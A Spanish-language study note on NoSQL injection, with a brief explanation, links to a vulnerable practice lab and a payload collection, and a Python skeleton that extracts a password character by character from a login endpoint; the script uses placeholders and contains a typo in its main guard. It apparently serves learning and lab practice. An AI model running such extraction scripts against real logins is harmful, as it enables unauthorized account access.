
Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

---------------------------

Para Practicar

[NoSQLI - Lab](https://github.com/Charlie-belmer/vulnerable-node-app)

```bash
git clone https://github.com/Charlie-belmer/vulnerable-node-app
cd vulnerable-node-app
docker-compose up -d
```

Web en **localhost:4000** y para agregar usuarios click en **Populate / Reset DB** y a practicar.

[NoSQLI - PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

ejemplo de script en python

```python
#!/usr/bin/python3
from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
	print("<mensaje_saliendo>")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "<url_a_explotar>"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
	password = ""

	p1= log.progress("Inyeccion")
	p1.status("Iniciando Inyeccion")

	time.sleep(2)

	p2 = log.progress("Password")

	for position in range(0, 100):
		for c in characters:

			post_data = '<data_post>'

			p1.status(post_data)

			headers = {<Header>}
		
			r = requests.post(login_url, headers=headers, data=post_data)

			if "<mensaje_respuesta>" in r.text:
				password += c
				p2.status(password)
				break

f __name__ == '__main__':

	makeNoSQLI()
```




